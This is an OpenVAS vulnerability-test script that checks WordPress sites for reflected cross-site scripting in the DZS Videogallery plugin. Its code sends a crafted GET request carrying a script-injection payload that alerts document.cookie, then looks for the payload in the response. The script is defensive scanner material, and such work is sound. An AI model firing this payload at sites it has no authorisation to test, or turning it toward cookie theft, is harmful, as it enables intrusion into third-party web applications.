###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_dzs_video_gallery_mult_vuln.nasl 5609 2017-03-20 08:08:00Z teissa $
#
# Wordpress DZS Videogallery Plugin Multiple Vulnerabilities 
#
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807610");
  script_version("$Revision: 5609 $");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-03-20 09:08:00 +0100 (Mon, 20 Mar 2017) $");
  script_tag(name:"creation_date", value:"2016-03-16 10:38:20 +0530 (Wed, 16 Mar 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("Wordpress DZS Videogallery Plugin Multiple Vulnerabilities");

  script_tag(name:"summary", value:"The host is installed with Wordpress
  DZS Videogallery Plugin and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET
  request and check whether it is able to read the cookie value or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to,
  - An insufficient validation of input to 'initer' parameter.
  - An insufficient validation of input to 'height' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow an
  unauthenticated remote attacker to conduct CSRF and cross-site scripting
  (xss)attacks.

  Impact Level: Application");

  script_tag(name:"affected", value:"Wordpress DZS Videogallery version
  8.60 and prior.");

  script_tag(name:"solution", value:"No solution or patch was made available for at least one year since disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/39553/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

## Variable Initialization
http_port = 0;
dir = "";
url = "";

## Get HTTP Port
if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

## Construct the attack request
url = dir + '/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=&type=7934f"><script>alert(document.cookie)</script>99085&width=';

# Try attack and check the response to confirm vulnerability
if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
  pattern:"<script>alert\(document.cookie\)</script>", extra_check:"dzs-videogallery"))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
